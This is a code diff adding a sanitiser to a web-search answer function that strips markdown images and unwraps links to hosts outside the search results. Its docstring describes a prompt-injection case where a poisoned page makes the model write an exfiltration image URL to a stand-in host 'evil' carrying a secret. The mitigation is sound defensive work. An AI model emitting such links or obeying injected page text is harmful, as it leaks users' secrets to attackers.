@@ -136,6 +136,15 @@ def _has_proper_noun(original: str) -> bool:
                for i, w in enumerate(words))
 
 
+def _plain_remote_markdown(text: str, allowed: set[str]) -> str:
+    """A poisoned page can make the model write ![x](https://evil/?d=SECRET) or a link there: the app would fetch or show it (SEC-01).
+    Images are dropped; a link keeps its words unless its host is one of the search results'."""
+    from urllib.parse import urlsplit
+
+    text = re.sub(r"!\[[^\]]*\]\([^)]*\)", "", text)
+    return re.sub(r"\[([^\]]+)\]\(([^)\s]*)[^)]*\)", lambda m: m.group(0) if urlsplit(m.group(2)).hostname in allowed else m.group(1), text)
+
+
 def web_answer(query: str, why: str) -> dict[str, Any] | None:
     """Answer from web search snippets only. None when the search finds nothing (the caller then keeps its own reply)."""
     from modules.qa import focus
@@ -149,6 +158,9 @@ def web_answer(query: str, why: str) -> dict[str, Any] | None:
         "a question that ARIA's own market data does not cover, answered only from these web search results", query, facts,
         summary=lambda lead: lead + "\n\n" + "\n".join(f"- {r['title']}: {r['snippet']}" for r in results[:3]))
     sources = [{"title": r["title"], "url": r["url"]} for r in results]
+    from urllib.parse import urlsplit
+
+    text = _plain_remote_markdown(text, {urlsplit(s["url"]).hostname for s in sources})
     return {"domain": "general", "query": query, "response": text + "\n\nSources: " + "; ".join(s["url"] for s in sources[:3]),
             "grounding": grounding, "context": {"web_sources": sources, "unavailable": [why]}}
 
